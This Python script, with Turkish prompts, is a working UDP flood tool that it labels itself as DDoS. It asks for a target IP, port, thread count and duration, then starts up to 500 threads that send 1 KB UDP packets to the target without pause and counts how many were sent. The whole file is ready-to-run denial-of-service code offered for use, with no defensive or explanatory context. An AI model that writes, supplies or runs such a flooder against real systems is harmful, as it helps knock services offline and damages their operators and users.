import socket
import threading
import time
from rich.console import Console

console = Console()


def run():
    target = console.input("[bold white]  Hedef IP: [/]").strip()
    port_str = console.input("[bold white]  Port (varsayilan 80): [/]").strip()
    port = int(port_str) if port_str.isdigit() else 80
    thread_str = console.input("[bold white]  Thread (varsayilan 100): [/]").strip()
    threads_num = int(thread_str) if thread_str.isdigit() and 0 < int(thread_str) <= 500 else 100
    duration_str = console.input("[bold white]  Sure (saniye, varsayilan 30): [/]").strip()
    duration = int(duration_str) if duration_str.isdigit() else 30

    if not target:
        console.print("[red]  IP bos olamaz.[/]")
        return

    console.print(f"[#818cf8]  DDoS baslatiliyor: {target}:{port} ({threads_num} thread, {duration}s)[/]")
    console.print("[yellow]  Ctrl+C ile durdurun.[/]")

    stop = [False]
    sent = [0]

    def attack():
        while not stop[0]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"X" * 1024
                s.sendto(data, (target, port))
                s.close()
                sent[0] += 1
            except Exception:
                pass

    try:
        threads = []
        for _ in range(threads_num):
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            threads.append(t)

        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            console.print(f"\r[#818cf8]  Paket: {sent[0]} | Sure: {elapsed}/{duration}s[/]", end="")
            time.sleep(1)

        stop[0] = True
        time.sleep(0.5)
    except KeyboardInterrupt:
        stop[0] = True

    console.print(f"\n[#818cf8]  Tamamlandi. Gonderilen paket: {sent[0]}[/]")
